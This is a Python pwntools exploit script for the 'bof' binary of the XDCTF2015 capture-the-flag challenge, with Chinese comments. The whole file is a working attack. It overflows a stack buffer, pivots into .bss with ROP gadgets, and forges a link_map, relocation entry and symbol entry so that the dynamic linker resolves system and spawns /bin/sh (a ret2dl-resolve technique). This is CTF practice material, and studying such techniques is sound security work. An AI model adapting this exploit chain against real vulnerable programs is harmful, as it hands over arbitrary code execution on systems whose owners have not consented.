#!/usr/bin/python
#coding:utf-8

from pwn import *
elf = ELF('bof')

offset = 112
read_plt = elf.plt['read']
write_plt = elf.plt['write']

ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"
pop_ebp_ret = 0x0804861b
leave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"

stack_size = 0x800
bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"
base_stage = bss_addr + stack_size

#x/100xw  GOT[4]
fake_link_map=bss_addr+0x100#elf.got['__libc_start_main']    #change!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
fake_st_value=0x774C5
val_0x34=0x08049f54
val_0x38=0x08049f5c
val_0x7c=0x08049f94
wait_time=0.1

r = process('bof')


r.recvuntil('Welcome to XDCTF2015~!\n')
payload = 'A' * offset
payload += p32(read_plt)
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(fake_link_map)#+0x34
payload += p32(0x100)
#payload += p32(read_plt)
#payload += p32(ppp_ret)
#payload += p32(0)
#payload += p32(fake_link_map+0x7c)
#payload += p32(4)
payload += p32(read_plt)
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret)
payload += p32(base_stage)
payload += p32(leave_ret)
#print 'length of payload=',hex(len(payload))
#raw_input('wait')
r.sendline(payload)
'''
sleep(wait_time)
r.send(p32(val_0x34)+p32(val_0x38))
sleep(wait_time)
r.send(p32(val_0x7c))
sleep(wait_time)
'''
pay=''
pay=pay.ljust(0x34,'\x00')
pay+=p32(val_0x34)+p32(val_0x38)
pay=pay.ljust(0x7c,'\x00')
pay+=p32(val_0x7c)
pay=pay.ljust(0x100,'\x00')
sleep(wait_time)
r.send(pay)


gdb.attach(r,'b *0x08048458')
cmd = "/bin/sh"
plt_0 = 0x08048380 # objdump -d -j .plt bof
plt_1=plt_0+6
rel_plt = 0x08048330 # objdump -s -j .rel.plt bof
index_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移
write_got = elf.got['write']
dynsym = 0x080481d8 #readelf -S bof
dynstr = 0x08048278
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)# 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (index_dynsym << 8) | 0x7
fake_reloc = p32(write_got) + p32(r_info)
st_name = (fake_sym_addr + 16) - dynstr        # fake_sym（Elf32_Sym结构体）大小0x10
#fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)
fake_sym = p32(st_name) + p32(fake_st_value) + p32(0) + p32(0x12)  #0x112


payload2 = 'AAAA'
payload2 += p32(plt_1)
payload2 += p32(fake_link_map)
payload2 += p32(index_offset)
payload2 += 'AAAA'   #ret_addr 返回地址
payload2 += p32(base_stage + 80)
#payload2 += 'aaaa'
payload2 += 'aaaa'
payload2 += fake_reloc # (base_stage+28)的位置
payload2 += 'B' * align
payload2 += fake_sym # (base_stage+36)的位置
payload2 += "system\x00"
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
raw_input('wait!!!')
r.sendline(payload2)
r.interactive()

#目标：0x8fa05 : cmp byte ptr [eax], dl ; pop edi ; ret
#>>> hex(elf.symbols['__libc_start_main'])
#'0x18540'
#fake_st_value=0x8fa05-0x18540=0x774C5
